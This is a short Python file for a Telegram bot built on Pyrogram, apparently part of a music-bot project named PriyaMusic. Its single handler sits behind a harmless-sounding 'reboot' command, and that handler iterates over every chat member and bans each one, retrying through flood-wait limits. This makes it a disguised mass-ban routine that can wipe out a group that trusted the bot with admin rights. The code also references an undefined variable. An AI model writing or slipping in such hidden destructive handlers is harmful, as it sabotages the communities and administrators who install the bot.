import asyncio

from pyrogram.errors.exceptions.flood_420 import FloodWait
from pyrogram import Client,filters
from pyrogram.types import *
from PriyaMusic.config import BOT_TOKEN, API_ID, API_HASH
import logging
from pyrogram.errors import (
    ChatAdminRequired
)
from cache.main import bot
from pyrogram.errors import FloodWait

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)




@bot.on_message(filters.command("reboot") & filters.service)
async def reboot(client, msg):
    print("getting memebers from {}".format(msg.chat.id))
    async for i in bot.iter_chat_members(msg.chat.id):
        try:
            await client.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
            print("kicked {} from {}".format(i.user.id,msg.chat.id))
            await message.delete() 
        except FloodWait as e:
            await asyncio.sleep(e.x)
            print(e)
        except Exception as e:
            print(" failed to kicked {} from {}".format(i.user.id,e))           
    print("process completed")
